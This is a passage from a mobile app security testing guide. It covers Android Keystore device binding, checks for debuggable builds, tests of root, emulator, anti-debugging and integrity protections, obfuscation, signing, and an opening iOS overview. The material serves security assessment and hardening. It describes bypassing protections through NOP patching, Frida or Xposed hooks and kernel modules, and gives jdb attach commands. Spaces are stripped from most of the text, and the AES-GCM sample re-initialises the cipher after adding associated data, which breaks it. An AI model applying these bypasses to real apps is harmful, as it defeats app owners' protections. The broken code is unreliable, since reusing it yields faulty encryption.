thandeviceB.ThesedifferentialprivilegesshouldnotchangewhenanappiscopiedfromdeviceAtodeviceB. Beforewedescribetheusableidentifiers,let’squicklydiscusshowtheycanbeusedforbinding. Therearethreemethods thatallowdevicebinding: • Augmentingthecredentialsusedforauthenticationwithdeviceidentifiers. Thismakesenseiftheapplicationneeds tore-authenticateitselfand/ortheuserfrequently. • Encryptingthedatastoredinthedevicewiththekeymaterialwhichisstronglyboundtothedevicecanstrengthen the device binding. The Android Keystore offers non-exportable private keys which we can use for this. When a maliciousactorwouldextractsuchdatafromadevice,itwouldn’tbepossibletodecryptthedata,asthekeyisnot accessible. Implementingthis,takesthefollowingsteps: – GeneratethekeypairintheAndroidKeystoreusingKeyGenParameterSpecAPI. //Source:<https://developer.android.com/reference/android/security/keystore/KeyGenParameterSpec.html> KeyPairGeneratorkeyPairGenerator =KeyPairGenerator.getInstance( KeyProperties.KEY_ALGORITHM_RSA,"AndroidKeyStore"); keyPairGenerator.initialize( newKeyGenParameterSpec.Builder( "key1", KeyProperties.PURPOSE_DECRYPT) .setDigests(KeyProperties.DIGEST_SHA256,KeyProperties.DIGEST_SHA512) .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_RSA_OAEP) .build()); KeyPairkeyPair =keyPairGenerator.generateKeyPair(); Ciphercipher =Cipher.getInstance("RSA/ECB/OAEPWithSHA-256AndMGF1Padding"); cipher.init(Cipher.DECRYPT_MODE,keyPair.getPrivate()); ... //ThekeypaircanalsobeobtainedfromtheAndroidKeystoreanytimeasfollows: KeyStorekeyStore =KeyStore.getInstance("AndroidKeyStore"); keyStore.load(null); PrivateKeyprivateKey =(PrivateKey)keyStore.getKey("key1",null); PublicKeypublicKey =keyStore.getCertificate("key1").getPublicKey(); – GeneratingasecretkeyforAES-GCM: //Source:<https://developer.android.com/reference/android/security/keystore/KeyGenParameterSpec.html> KeyGeneratorkeyGenerator = KeyGenerator.getInstance( KeyProperties.KEY_ALGORITHM_AES,"AndroidKeyStore"); keyGenerator.init( newKeyGenParameterSpec.Builder("key2", KeyProperties.PURPOSE_ENCRYPT |KeyProperties.PURPOSE_DECRYPT) .setBlockModes(KeyProperties.BLOCK_MODE_GCM) .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_NONE) 316\n.build()); SecretKeykey =keyGenerator.generateKey(); //ThekeycanalsobeobtainedfromtheAndroidKeystoreanytimeasfollows: KeyStorekeyStore =KeyStore.getInstance("AndroidKeyStore"); keyStore.load(null); key=(SecretKey)keyStore.getKey("key2",null); – Encrypttheauthenticationdataandothersensitivedatastoredbytheapplicationusingasecretkeythrough AES-GCMcipherandusedevicespecificparameterssuchasInstanceID,etc. asassociateddata: Ciphercipher =Cipher.getInstance("AES/GCM/NoPadding"); final byte[]nonce =newbyte[GCM_NONCE_LENGTH]; random.nextBytes(nonce); GCMParameterSpecspec =new GCMParameterSpec(GCM_TAG_LENGTH *8,nonce); cipher.init(Cipher.ENCRYPT_MODE,key,spec); byte[]aad="<deviceidentifierhere>".getBytes();; cipher.updateAAD(aad); cipher.init(Cipher.ENCRYPT_MODE,key); //usetheciphertoencrypttheauthenticationdatasee0x50eformoredetails. – EncryptthesecretkeyusingthepublickeystoredinAndroidKeystoreandstoretheencryptedsecretkeyin theprivatestorageoftheapplication. – Wheneverauthenticationdatasuchasaccesstokensorothersensitivedataisrequired,decryptthesecretkey usingprivatekeystoredinAndroidKeystoreandthenusethedecryptedsecretkeytodecrypttheciphertext. • Usetoken-baseddeviceauthentication(InstanceID)tomakesurethatthesameinstanceoftheappisused. Testing whether the App is Debuggable Platform: android MASVSV1: MSTG-CODE-2 MASVSV2: MASVS-RESILIENCE-4 Overview Static Analysis Check AndroidManifest.xml to determine whether the android:debuggable attribute has been set and to find the attribute’svalue: ... <application android:allowBackup="true" android:debuggable="true" android:icon="@drawable/ic_launcher" android:label="@string/app_name" ↪ android:theme="@style/AppTheme"> ... You can use aapt tool from the Android SDK with the following command line to quickly check if the an- droid:debuggable="true"directiveispresent: ##Ifthecommandprint1thenthedirectiveispresent ##Theregexsearchforthisline:android:debuggable(0x0101000f)=(type0x12)0xffffffff $aaptdxmltreesieve.apkAndroidManifest.xml |grep -Ec"android:debuggable\(0x[0-9a-f]+\)=\(type\s0x[0-9a-f]+\)0xffffffff" 1 Forareleasebuild,thisattributeshouldalwaysbesetto"false"(thedefaultvalue). Dynamic Analysis adbcanbeusedtodeterminewhetheranapplicationisdebuggable. Usethefollowingcommand: 317\n##Ifthecommandprintanumbersuperiortozerothentheapplicationhavethedebugflag ##Theregexsearchfortheselines: ##flags=[DEBUGGABLEHAS_CODEALLOW_CLEAR_USER_DATAALLOW_BACKUP] ##pkgFlags=[DEBUGGABLEHAS_CODEALLOW_CLEAR_USER_DATAALLOW_BACKUP] $adbshelldumpsyspackagecom.mwr.example.sieve |grep -c"DEBUGGABLE" 2 $adbshelldumpsyspackagecom.nondebuggableapp |grep -c"DEBUGGABLE" 0 Ifanapplicationisdebuggable,executingapplicationcommandsistrivial. Intheadbshell,executerun-asbyappending thepackagenameandapplicationcommandtothebinaryname: $run-ascom.vulnerable.appid uid=10084(u0_a84)gid=10084(u0_a84) ↪ groups=10083(u0_a83),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats) ↪ context=u:r:untrusted_app:s0:c512,c768 AndroidStudiocanalsobeusedtodebuganapplicationandverifydebuggingactivationforanapp. Anothermethodfordeterminingwhetheranapplicationisdebuggableisattachingjdbtotherunningprocess. Ifthisis successful,debuggingwillbeactivated. Thefollowingprocedurecanbeusedtostartadebugsessionwithjdb: 1. Usingadbandjdwp,identifythePIDoftheactiveapplicationthatyouwanttodebug: $adb jdwp 2355 16346 <==last launched,correspondstoourapplication 2. Createacommunicationchannelbyusingadbbetweentheapplicationprocess(withthePID)andyourhostcom- puterbyusingaspecificlocalport: #adb forwardtcp:[LOCAL_PORT]jdwp:[APPLICATION_PID] $adb forwardtcp:55555jdwp:16346 3. Usingjdb,attachthedebuggertothelocalcommunicationchannelportandstartadebugsession: $jdb -connect com.sun.jdi.SocketAttach:hostname=localhost,port=55555 Setuncaught java.lang.Throwable Setdeferred uncaughtjava.lang.Throwable Initializingjdb ... >help Afewnotesaboutdebugging: • ThetoolJADXcanbeusedtoidentifyinterestinglocationsforbreakpointinsertion. • UsageofbasiccommandsforjdbcanbefoundatTutorialspoint. • Ifyougetanerrortellingthat“theconnectiontothedebuggerhasbeenclosed”whilejdbisbeingboundtothe localcommunicationchannelport,killalladbsessionsandstartasinglenewsession. Testing Reverse Engineering Tools Detection Platform: android MASVSV1: MSTG-RESILIENCE-4 MASVSV2: MASVS-RESILIENCE-4 Effectiveness Assessment Launchtheappwithvariousreverseengineeringtoolsandframeworksinstalledinyourtestdevice. Includeatleastthe following: Frida,Xposed,SubstrateforAndroid,RootCloak,AndroidSSLTrustKiller. Theappshouldrespondinsomewaytothepresenceofthosetools. Forexampleby: • Alertingtheuserandaskingforacceptingliability. 318\n• Preventingexecutionbygracefullyterminating. • Securelywipinganysensitivedatastoredonthedevice. • Reportingtoabackendserver,e.g,forfrauddetection. Next,workonbypassingthedetectionofthereverseengineeringtoolsandanswerthefollowingquestions: • Canthemechanismsbebypassedtrivially(e.g.,byhookingasingleAPIfunction)? • Howdifficultisidentifyingtheantireverseengineeringcodeviastaticanddynamicanalysis? • Didyouneedtowritecustomcodetodisablethedefenses? Howmuchtimedidyouneed? • Whatisyourassessmentofthedifficultyofbypassingthemechanisms? Thefollowingstepsshouldguideyouwhenbypassingdetectionofreverseengineeringtools: 1. Patchtheantireverseengineeringfunctionality. Disabletheunwantedbehaviorbysimplyoverwritingtheassoci- atedbytecodeornativecodewithNOPinstructions. 2. UseFridaorXposedtohookfilesystemAPIsontheJavaandnativelayers. Returnahandletotheoriginalfile,not themodifiedfile. 3. Use a kernel module to intercept file-related system calls. When the process attempts to open the modified file, returnafiledescriptorfortheunmodifiedversionofthefile. Refertothe“TamperingandReverseEngineeringonAndroid”chapterforexamplesofpatching,codeinjection,andkernel modules. Testing Root Detection Platform: android MASVSV1: MSTG-RESILIENCE-1 MASVSV2: MASVS-RESILIENCE-1 Bypassing Root Detection Run execution traces with jdb, DDMS, strace, and/or kernel modules to find out what the app is doing. You’ll usually see all kinds of suspect interactions with the operating system, such as opening su for reading and obtaining a list of processes. Theseinteractionsaresurefiresignsofrootdetection. Identifyanddeactivatetherootdetectionmechanisms, oneatatime. Ifyou’reperformingablackboxresilienceassessment,disablingtherootdetectionmechanismsisyour firststep. Tobypassthesechecks,youcanuseseveraltechniques,mostofwhichwereintroducedinthe“ReverseEngineeringand Tampering”chapter: • Renamingbinaries. Forexample,insomecasessimplyrenamingthesubinaryisenoughtodefeatrootdetection (trynottobreakyourenvironmentthough!). • Unmounting/proctopreventreadingofprocesslists. Sometimes,theunavailabilityof/procisenoughtobypass suchchecks. • UsingFridaorXposedtohookAPIsontheJavaandnativelayers. Thishidesfilesandprocesses,hidesthecontents offiles,andreturnsallkindsofbogusvaluesthattheapprequests. • Hookinglow-levelAPIsbyusingkernelmodules. • Patchingtheapptoremovethechecks. Effectiveness Assessment Checkforrootdetectionmechanisms,includingthefollowingcriteria: • Multiple detection methods are scattered throughout the app (as opposed to putting everything into a single method). • TherootdetectionmechanismsoperateonmultipleAPIlayers(JavaAPIs,nativelibraryfunctions,assembler/system calls). 319\n• Themechanismsaresomehoworiginal(they’renotcopiedandpastedfromStackOverfloworothersources). Developbypassmethodsfortherootdetectionmechanismsandanswerthefollowingquestions: • Canthemechanismsbeeasilybypassedwithstandardtools,suchasRootCloak? • Isstatic/dynamicanalysisnecessarytohandletherootdetection? • Doyouneedtowritecustomcode? • Howlongdidsuccessfullybypassingthemechanismstake? • Whatisyourassessmentofthedifficultyofbypassingthemechanisms? Ifrootdetectionismissingortooeasilybypassed,makesuggestionsinlinewiththeeffectivenesscriterialistedabove. These suggestions may include more detection mechanisms and better integration of existing mechanisms with other defenses. Testing File Integrity Checks Platform: android MASVSV1: MSTG-RESILIENCE-3 MASVSV2: MASVS-RESILIENCE-2 Bypassing File Integrity Checks Bypassing the application-source integrity checks 1. Patchtheanti-debuggingfunctionality. Disabletheunwantedbehaviorbysimplyoverwritingtheassociatedbyte- codeornativecodewithNOPinstructions. 2. Use Frida or Xposed to hook file system APIs on the Java and native layers. Return a handle to the original file insteadofthemodifiedfile. 3. Usethekernelmoduletointerceptfile-relatedsystemcalls. Whentheprocessattemptstoopenthemodifiedfile, returnafiledescriptorfortheunmodifiedversionofthefile. Refertothe“TamperingandReverseEngineeringonAndroid”chapterforexamplesofpatching,codeinjection,andkernel modules. Bypassing the storage integrity checks 1. Retrievethedatafromthedevice. 2. Altertheretrieveddataandthenputitbackintostorage. Effectiveness Assessment Application-sourceintegritychecks: Runtheappinanunmodifiedstateandmakesurethateverythingworks. Applysimplepatchestoclasses.dexandany .so libraries in the app package. Re-package and re-sign the app as described in the “Basic Security Testing” chapter, thenruntheapp. Theappshoulddetectthemodificationandrespondinsomeway. Attheveryleast, theappshould alerttheuserand/orterminate. Workonbypassingthedefensesandanswerthefollowingquestions: • Canthemechanismsbebypassedtrivially(e.g.,byhookingasingleAPIfunction)? • Howdifficultisidentifyingtheanti-debuggingcodeviastaticanddynamicanalysis? • Didyouneedtowritecustomcodetodisablethedefenses? Howmuchtimedidyouneed? • Whatisyourassessmentofthedifficultyofbypassingthemechanisms? Storageintegritychecks: Anapproachsimilartothatforapplication-sourceintegritychecksapplies. Answerthefollowingquestions: • Canthemechanismsbebypassedtrivially(e.g.,bychangingthecontentsofafileorakey-value)? 320\n• HowdifficultisgettingtheHMACkeyortheasymmetricprivatekey? • Didyouneedtowritecustomcodetodisablethedefenses? Howmuchtimedidyouneed? • Whatisyourassessmentofthedifficultyofbypassingthemechanisms? Testing for Debugging Symbols Platform: android MASVSV1: MSTG-CODE-3 MASVSV2: MASVS-RESILIENCE-3 Overview Static Analysis Symbolsareusuallystrippedduringthebuildprocess,soyouneedthecompiledbytecodeandlibrariestomakesurethat unnecessarymetadatahasbeendiscarded. First,findthenmbinaryinyourAndroidNDKandexportit(orcreateanalias). export NM=$ANDROID_NDK_DIR/toolchains/arm-linux-androideabi-4.9/prebuilt/darwin-x86_64/bin/arm-linux-androideabi-nm Todisplaydebugsymbols: $NM-alibfoo.so /tmp/toolchains/arm-linux-androideabi-4.9/prebuilt/darwin-x86_64/bin/arm-linux-androideabi-nm:libfoo.so:nosymbols Todisplaydynamicsymbols: $NM-Dlibfoo.so Alternatively,openthefileinyourfavoritedisassemblerandcheckthesymboltablesmanually. Dynamicsymbolscanbestrippedviathevisibilitycompilerflag. Addingthisflagcausesgcctodiscardthefunction nameswhilepreservingthenamesoffunctionsdeclaredasJNIEXPORT. Makesurethatthefollowinghasbeenaddedtobuild.gradle: externalNativeBuild{ cmake{ cppFlags"-fvisibility=hidden" } } Dynamic Analysis Staticanalysisshouldbeusedtoverifydebuggingsymbols. Testing for Debugging Code and Verbose Error Logging Platform: android MASVSV1: MSTG-CODE-4 MASVSV2: MASVS-RESILIENCE-3 321\nOverview Static Analysis To determine whether StrictMode is enabled, you can look for the StrictMode.setThreadPolicy or StrictMode. setVmPolicymethods. Mostlikely,theywillbeintheonCreatemethod. Thedetectionmethodsforthethreadpolicyare detectDiskWrites() detectDiskReads() detectNetwork() Thepenaltiesforthreadpolicyviolationare penaltyLog()//LogsamessagetoLogCat penaltyDeath()//Crashesapplication,runsattheendofallenabledpenalties penaltyDialog()//Showsadialog HavealookatthebestpracticesforusingStrictMode. Dynamic Analysis There are several ways of detecting StrictMode; the best choice depends on how the policies’ roles are implemented. Theyinclude • Logcat, • awarningdialog, • applicationcrash. Testing Anti-Debugging Detection Platform: android MASVSV1: MSTG-RESILIENCE-2 MASVSV2: MASVS-RESILIENCE-4 Bypassing Debugger Detection There’s no generic way to bypass anti-debugging: the best method depends on the particular mechanism(s) used to prevent or detect debugging and the other defenses in the overall protection scheme. For example, if there are no integrity checks or you’ve already deactivated them, patching the app might be the easiest method. In other cases, a hooking framework or kernel modules might be preferable. The following methods describe different approaches to bypassdebuggerdetection: • Patchingtheanti-debuggingfunctionality: DisabletheunwantedbehaviorbysimplyoverwritingitwithNOPinstruc- tions. Notethatmorecomplexpatchesmayberequirediftheanti-debuggingmechanismiswelldesigned. • UsingFridaorXposedtohookAPIsontheJavaandnativelayers: manipulatethereturnvaluesoffunctionssuch asisDebuggableandisDebuggerConnectedtohidethedebugger. • Changingtheenvironment: Androidisanopenenvironment. Ifnothingelseworks,youcanmodifytheoperating systemtosubverttheassumptionsthedevelopersmadewhendesigningtheanti-debuggingtricks. 322\nBypassing Example: UnCrackable App for Android Level 2 When dealing with obfuscated apps, you’ll often find that developers purposely “hide away” data and functionality in nativelibraries. You’llfindanexampleofthisinlevel2ofthe“UnCrackableAppforAndroid”. At first glance, the code looks like the prior challenge. A class called CodeCheck is responsible for verifying the code enteredbytheuser. Theactualcheckappearstooccurinthebarmethod,whichisdeclaredasanativemethod. package sg.vantagepoint.uncrackable2; public class CodeCheck { public CodeCheck(){ super(); } public boolean a(Stringarg2){ return this.bar(arg2.getBytes()); } private native boolean bar(byte[]arg1){ } } static { System.loadLibrary("foo"); } PleaseseedifferentproposedsolutionsfortheAndroidCrackmeLevel2inGitHub. Effectiveness Assessment Checkforanti-debuggingmechanisms,includingthefollowingcriteria: • Attachingjdbandptrace-baseddebuggersfailsorcausestheapptoterminateormalfunction. • Multipledetectionmethodsarescatteredthroughouttheapp’ssourcecode(asopposedtotheirallbeinginasingle methodorfunction). • Theanti-debuggingdefensesoperateonmultipleAPIlayers(Java,nativelibraryfunctions,assembler/systemcalls). • The mechanisms are somehow original (as opposed to being copied and pasted from StackOverflow or other sources). Workonbypassingtheanti-debuggingdefensesandanswerthefollowingquestions: • Canthemechanismsbebypassedtrivially(e.g.,byhookingasingleAPIfunction)? • Howdifficultisidentifyingtheanti-debuggingcodeviastaticanddynamicanalysis? • Didyouneedtowritecustomcodetodisablethedefenses? Howmuchtimedidyouneed? • Whatisyoursubjectiveassessmentofthedifficultyofbypassingthemechanisms? Ifanti-debuggingmechanismsaremissingortooeasilybypassed,makesuggestionsinlinewiththeeffectivenesscriteria above. Thesesuggestionsmayincludeaddingmoredetectionmechanismsandbetterintegrationofexistingmechanisms withotherdefenses. Testing Runtime Integrity Checks Platform: android MASVSV1: MSTG-RESILIENCE-6 MASVSV2: MASVS-RESILIENCE-2 Effectiveness Assessment Makesurethatallfile-baseddetectionofreverseengineeringtoolsisdisabled. Then,injectcodebyusingXposed,Frida, andSubstrate,andattempttoinstallnativehooksandJavamethodhooks. Theappshoulddetectthe“hostile”codein itsmemoryandrespondaccordingly. Workonbypassingthecheckswiththefollowingtechniques: 323\n1. Patchtheintegritychecks. Disabletheunwantedbehaviorbyoverwritingtherespectivebytecodeornativecode withNOPinstructions. 2. UseFridaorXposedtohooktheAPIsusedfordetectionandreturnfakevalues. Refertothe“TamperingandReverseEngineeringonAndroid”chapterforexamplesofpatching,codeinjection,andkernel modules. Testing Obfuscation Platform: android MASVSV1: MSTG-RESILIENCE-9 MASVSV2: MASVS-RESILIENCE-3 Overview Static Analysis DecompiletheAPKandreviewittodeterminewhetherthecodebasehasbeenobfuscated. Belowyoucanfindasampleforanobfuscatedcodeblock: package com.a.a.a; import com.a.a.b.a; import java.util.List; class a$b extends a { public a$b(ListparamList) { super(paramList); } public boolean areAllItemsEnabled() { return true; } public boolean isEnabled(intparamInt) { return true; } } Herearesomeconsiderations: • Meaningfulidentifiers,suchasclassnames,methodnames,andvariablenames,mighthavebeendiscarded. • Stringresourcesandstringsinbinariesmighthavebeenencrypted. • Codeanddatarelatedtotheprotectedfunctionalitymightbeencrypted,packed,orotherwiseconcealed. Fornativecode: • libcAPIs(e.gopen,read)mighthavebeenreplacedwithOSsyscalls. • Obfuscator-LLVMmighthavebeenappliedtoperform“ControlFlowFlattening”or“BogusControlFlow”. Some of these techniques are discussed and analyzed in the blog post“Security hardening of Android native code” by GautamArvindandinthe“APKiD:FastIdentificationofAppShieldingProducts”presentationbyEduardoNovella. Foramoredetailedassessment,youneedadetailedunderstandingoftherelevantthreatsandtheobfuscationmethods used. ToolssuchasAPKiDmaygiveyouadditionalindicationsaboutwhichtechniqueswereusedforthetargetappsuch asobfuscators,packersandanti-debugmeasures. 324\nDynamic Analysis YoucanuseAPKiDtodetectiftheapphasbeenobfuscated. ExampleusingtheUnCrackableAppforAndroidLevel4: apkidowasp-mastg/Crackmes/Android/Level_04/r2pay-v1.0.apk [+]APKiD2.1.2::fromRedNaga::rednaga.io [*]owasp-mastg/Crackmes/Android/Level_04/r2pay-v1.0.apk!classes.dex |->anti_vm:Build.TAGScheck,possiblero.securecheck |->compiler:r8 |->obfuscator:unreadablefieldnames,unreadablemethodnames Inthiscaseitdetectsthattheapphasunreadablefieldnamesandmethodnames,amongotherthings. Testing Emulator Detection Platform: android MASVSV1: MSTG-RESILIENCE-5 MASVSV2: MASVS-RESILIENCE-1 Bypassing Emulator Detection 1. Patch the emulator detection functionality. Disable the unwanted behavior by simply overwriting the associated bytecodeornativecodewithNOPinstructions. 2. Use Frida or Xposed APIs to hook file system APIs on the Java and native layers. Return innocent-looking values (preferably taken from a real device) instead of the telltale emulator values. For example, you can override the TelephonyManager.getDeviceIDmethodtoreturnanIMEIvalue. Refertothe“TamperingandReverseEngineeringonAndroid”chapterforexamplesofpatching,codeinjection,andkernel modules. Effectiveness Assessment Installandruntheappintheemulator. Theappshoulddetectthatitisbeingexecutedinanemulatorandterminateor refusetoexecutethefunctionalitythat’smeanttobeprotected. Workonbypassingthedefensesandanswerthefollowingquestions: • Howdifficultisidentifyingtheemulatordetectioncodeviastaticanddynamicanalysis? • Canthedetectionmechanismsbebypassedtrivially(e.g.,byhookingasingleAPIfunction)? • Didyouneedtowritecustomcodetodisabletheanti-emulationfeature(s)? Howmuchtimedidyouneed? • Whatisyourassessmentofthedifficultyofbypassingthemechanisms? Making Sure that the App is Properly Signed Platform: android MASVSV1: MSTG-CODE-1 MASVSV2: MASVS-RESILIENCE-2 325\nOverview Static Analysis Makesurethatthereleasebuildhasbeensignedviaboththev1andv2schemesforAndroid7.0(APIlevel24)andabove and via all the three schemes for Android 9 (API level 28) and above, and that the code-signing certificate in the APK belongstothedeveloper. APKsignaturescanbeverifiedwiththeapksignertool. Itislocatedat[SDK-Path]/build-tools/[version]. $apksignerverify --verbose Desktop/example.apk Verifies Verifiedusingv1scheme (JARsigning):true Verifiedusingv2scheme (APKSignatureSchemev2):true Verifiedusingv3scheme (APKSignatureSchemev3):true Numberofsigners:1 Thecontentsofthesigningcertificatecanbeexaminedwithjarsigner. NotethattheCommonName(CN)attributeis setto“AndroidDebug”inthedebugcertificate. TheoutputforanAPKsignedwithadebugcertificateisshownbelow: $jarsigner -verify -verbose -certs example.apk sm 11116FriNov1112:07:48ICT2016AndroidManifest.xml X.509,CN=AndroidDebug,O=Android,C=US [certificateisvalidfrom3/24/169:18AMto8/10/439:18AM] [CertPathnotvalidated:Pathdoesn\'tchainwithanyofthetrustanchors] (...) Ignorethe“CertPathnotvalidated”error. ThiserroroccurswithJavaSDK7andabove. Insteadofjarsigner, youcan relyontheapksignertoverifythecertificatechain. The signing configuration can be managed through Android Studio or the signingConfig block in build.gradle. To activateboththev1andv2schemes,thefollowingvaluesmustbeset: v1SigningEnabledtrue v2SigningEnabledtrue SeveralbestpracticesforconfiguringtheappforreleaseareavailableintheofficialAndroiddeveloperdocumentation. Lastbutnotleast: makesurethattheapplicationisneverdeployedwithyourinternaltestingcertificates. Dynamic Analysis StaticanalysisshouldbeusedtoverifytheAPKsignature. 326\niOS Platform Overview iOSisamobileoperatingsystemthatpowersApplemobiledevices,includingtheiPhone,iPad,andiPodTouch. Itisalso thebasisforAppletvOS,whichinheritsmanyfunctionalitiesfromiOS.ThissectionintroducestheiOSplatformfroman architecturepointofview. Thefollowingfivekeyareasarediscussed: 1. iOSsecurityarchitecture 2. iOSapplicationstructure 3. Inter-processCommunication(IPC) 4. iOSapplicationpublishing 5. iOSApplicationAttackSurface LiketheAppledesktopoperatingsystemmacOS(formerlyOSX),iOSisbasedonDarwin,anopensourceUnixoperating systemdevelopedbyApple. Darwin’skernelisXNU(“XisNotUnix”),ahybridkernelthatcombinescomponentsofthe MachandFreeBSDkernels. However,iOSappsruninamorerestrictedenvironmentthantheirdesktopcounterpartsdo. iOSappsareisolatedfrom eachotheratthefilesystemlevelandaresignificantlylimitedintermsofsystemAPIaccess. Toprotectusersfrommaliciousapplications, Applerestrictsandcontrolsaccesstotheappsthatareallowedtorunon iOSdevices. Apple’sAppStoreistheonlyofficialapplicationdistributionplatform. Theredeveloperscanoffertheirapps andconsumerscanbuy,download,andinstallapps. ThisdistributionstylediffersfromAndroid,whichsupportsseveral appstoresandsideloading(installinganapponyouriOSdevicewithoutusingtheofficialAppStore). IniOS,sideloading typicallyreferstotheappinstallationmethodviaUSB,althoughthereareotherenterpriseiOSappdistributionmethods thatdonotusetheAppStoreundertheAppleDeveloperEnterpriseProgram. Inthepast,sideloadingwaspossibleonlywithajailbreakorcomplicatedworkarounds. WithiOS9orhigher,itispossible tosideloadviaXcode. iOSappsareisolatedfromeachotherviaApple’siOSsandbox(historicallycalledSeatbelt),amandatoryaccesscontrol (MAC) mechanism describing the resources an app can and can’t access. Compared to Android’s extensive Binder IPC facilities,iOSoffersveryfewIPC(InterProcessCommunication)options,minimizingthepotentialattacksurface. Uniform hardware and tight hardware/software integration create another security advantage. Every iOS device offers securityfeatures,suchassecureboot,hardware-backedKeychain,andfilesystemencryption(referredasdataprotection iniOS).iOSupdatesareusuallyquicklyrolledouttoalargepercentageofusers,decreasingtheneedtosupportolder, unprotectediOSversions. InspiteofthenumerousstrengthsofiOS,iOSappdevelopersstillneedtoworryaboutsecurity. Dataprotection,Keychain, TouchID/FaceIDauthentication,andnetworksecuritystillleavealargemarginforerrors. Inthefollowingchapters,we describe iOS security architecture, explain a basic security testing methodology, and providereverse engineering how- tos. iOS Security Architecture TheiOSsecurityarchitecture,officiallydocumentedbyAppleintheiOSSecurityGuide,consistsofsixcorefeatures. This securityguideisupdatedbyAppleforeachmajoriOSversion: • HardwareSecurity • SecureBoot • CodeSigning • Sandbox • EncryptionandDataProtection • GeneralExploitMitigations 327\nHardware Security The iOS security architecture makes good use of hardware-based security features that enhance overall performance. Each iOS device comes with two built-in Advanced Encryption Standard (AES) 256-bit keys. The device’s unique IDs (UIDs)andadevicegroupIDs(GIDs)areAES256-bitkeysfused(UID)orcompiled(GID)intotheApplicationProcessor (AP)andSecureEnclaveProcessor(SEP)duringmanufacturing. There’snodirectwaytoreadthesekeyswithsoftwareor debugginginterfacessuchasJTAG.EncryptionanddecryptionoperationsareperformedbyhardwareAEScrypto-engines thathaveexclusiveaccesstothesekeys. TheGIDisavaluesharedbyallprocessorsinaclassofdevicesusedtopreventtamperingwithfirmwarefilesandother cryptographic tasks not directly related to the user’s private data. UIDs, which are unique to each device, are used to protect the key hierarchy that’s used for device-level file system encryption. Because UIDs aren’t recorded during manufacturing,notevenApplecanrestorethefileencryptionkeysforaparticulardevice. Toallowsecuredeletionofsensitivedataonflashmemory,iOSdevicesincludeafeaturecalledEffaceableStorage. This featureprovidesdirectlow-levelaccesstothestoragetechnology,makingitpossibletosecurelyeraseselectedblocks. Secure Boot WhenaniOSdeviceispoweredon,itreadstheinitialinstructionsfromtheread-onlymemoryknownasBootROM,which bootstrapsthesystem. TheBootROMcontainsimmutablecodeandtheAppleRootCA,whichisetchedintothesilicon chipduringthefabricationprocess,therebycreatingtherootoftrust. Next,theBootROMmakessurethattheLLB’s(Low LevelBootloader)signatureiscorrect,andtheLLBchecksthattheiBootbootloader’ssignatureiscorrecttoo. Afterthe signatureisvalidated,theiBootchecksthesignatureofthenextbootstage,whichistheiOSkernel. Ifanyofthesesteps fail,thebootprocesswillterminateimmediatelyandthedevicewillenterrecoverymodeanddisplaytherestorescreen. However, if the Boot ROM fails to load, the device will enter a special low-level recovery mode called Device Firmware Upgrade(DFU).Thisisthelastresortforrestoringthedevicetoitsoriginalstate. Inthismode,thedevicewillshowno signofactivity;i.e.,itsscreenwon’tdisplayanything. 328\nThis entire process is called the “Secure Boot Chain”. Its purpose is focused on verifying the boot process integrity, ensuringthatthesystemanditscomponentsarewrittenanddistributedbyApple. TheSecureBootchainconsistsofthe kernel,thebootloader,thekernelextension,andthebasebandfirmware. Code Signing ApplehasimplementedanelaborateDRMsystemtomakesurethatonlyApple-approvedcoderunsontheirdevices,that is,codesignedbyApple. Inotherwords,youwon’tbeabletorunanycodeonaniOSdevicethathasn’tbeenjailbroken unlessAppleexplicitlyallowsit. EndusersaresupposedtoinstallappsthroughtheofficialApple’sAppStoreonly. For thisreason(andothers),iOShasbeencomparedtoacrystalprison. A developer profile and an Apple-signed certificate are required to deploy and run an application. Developers need to registerwithApple,jointheAppleDeveloperProgramandpayayearlysubscriptiontogetthefullrangeofdevelopment anddeploymentpossibilities. There’salsoafreedeveloperaccountthatallowsyoutocompileanddeployapps(butnot distributethemintheAppStore)viasideloading. AccordingtotheArchivedAppleDeveloperDocumentationthecodesignatureconsistsofthreeparts: • Aseal. Thisisacollectionofchecksumsorhashesofthevariouspartsofthecode, createdbythecodesigning software. Thesealcanbeusedatverificationtimetodetectalterations. • A digital signature. The code signing software encrypts the seal using the signer’s identity to create a digital signature. Thisguaranteestheseal’sintegrity. • Coderequirements. Thesearetherulesgoverningverificationofthecodesignature. Dependingonthegoals,some areinherenttotheverifier,whileothersarespecifiedbythesignerandsealedwiththerestofthecode. Learnmore: • CodeSigningGuide(ArchivedAppleDeveloperDocumentation) • CodeSigning(AppleDeveloperDocumentation) • DemystifyingiOSCodeSignature Encryption and Data Protection FairPlay Code Encryption is applied to apps downloaded from the App Store. FairPlay was developed as a DRM when purchasing multimedia content. Originally, FairPlay encryption was applied to MPEG and QuickTime streams, but the samebasicconceptscanalsobeappliedtoexecutablefiles. Thebasicideaisasfollows: OnceyouregisteranewApple user account, or Apple ID, a public/private key pair will be created and assigned to your account. The private key is securelystoredonyourdevice. ThismeansthatFairPlay-encryptedcodecanbedecryptedonlyondevicesassociated withyouraccount. ReverseFairPlayencryptionisusuallyobtainedbyrunningtheapponthedevice,thendumpingthe decryptedcodefrommemory(seealso“BasicSecurityTestingoniOS”). 329\nApplehasbuiltencryptionintothehardwareandfirmwareofitsiOSdevicessincethereleaseoftheiPhone3GS.Every devicehasadedicatedhardware-basedcryptographicenginethatprovidesanimplementationoftheAES256-bitencryp- tionandtheSHA-1hashingalgorithms. Inaddition,there’sauniqueidentifier(UID)builtintoeachdevice’shardwarewith anAES256-bitkeyfusedintotheApplicationProcessor. ThisUIDisuniqueandnotrecordedelsewhere. Atthetimeof writing,neithersoftwarenorfirmwarecandirectlyreadtheUID.Becausethekeyisburnedintothesiliconchip,itcan’t betamperedwithorbypassed. Onlythecryptoenginecanaccessit. Buildingencryptionintothephysicalarchitecturemakesitadefaultsecurityfeaturethatcanencryptalldatastoredonan iOSdevice. Asaresult,dataprotectionisimplementedatthesoftwarelevelandworkswiththehardwareandfirmware encryptiontoprovidemoresecurity. When data protection is enabled, by simply establishing a passcode in the mobile device, each data file is associated with a specific protection class. Each class supports a different level of accessibility and protects data on the basis of when the data needs to be accessed. The encryption and decryption operations associated with each class are based onmultiplekeymechanismsthatutilizethedevice’sUIDandpasscode,aclasskey,afilesystemkey,andaper-filekey. The per-file key is used to encrypt the file’s contents. The class key is wrapped around the per-file key and stored in the file’s metadata. The file system key is used to encrypt the metadata. The UID and passcode protect the class key. This operation is invisible to users. To 